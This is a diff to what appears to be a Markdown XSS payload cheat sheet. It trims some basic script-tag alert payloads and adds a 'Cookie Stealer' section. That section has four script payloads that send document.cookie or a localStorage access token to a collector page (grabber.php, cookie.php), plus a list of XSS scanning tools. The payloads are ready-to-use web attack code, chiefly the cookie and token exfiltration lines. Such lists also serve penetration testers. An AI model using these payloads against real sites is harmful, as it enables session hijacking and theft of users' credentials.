@@ -1,8 +1,4 @@
-# Basic Tag + Event Listener + Popup Combinations
-### Script Tag Payloads
-```html
-<script>alert(1)</script>
-<script>confirm(1)</script>
+# Basic Tag PAYLOADS
 <script>prompt(1)</script>
 <script onload="alert(1)"></script>
 <script onerror="confirm(1)"></script>
@@ -119,3 +115,24 @@
 <img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
 <svg onload="&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;">
 ```
+
+### Cookie Stealer
+
+Obtains the administrator cookie or sensitive access token, the following payload will send it to a controlled page.
+
+```html
+<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
+<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
+<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
+<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
+```
+
+### Tools
+
+Most tools are also suitable for blind XSS attacks:
+
+- [XSSStrike](https://github.com/s0md3v/XSStrike): Very popular but unfortunately not very well maintained
+- [xsser](https://github.com/epsylon/xsser): Utilizes a headless browser to detect XSS vulnerabilities
+- [Dalfox](https://github.com/hahwul/dalfox): Extensive functionality and extremely fast thanks to the implementation in Go
+- [XSpear](https://github.com/hahwul/XSpear): Similar to Dalfox but based on Ruby
+- [domdig](https://github.com/fcavallarin/domdig): Headless Chrome XSS Tester
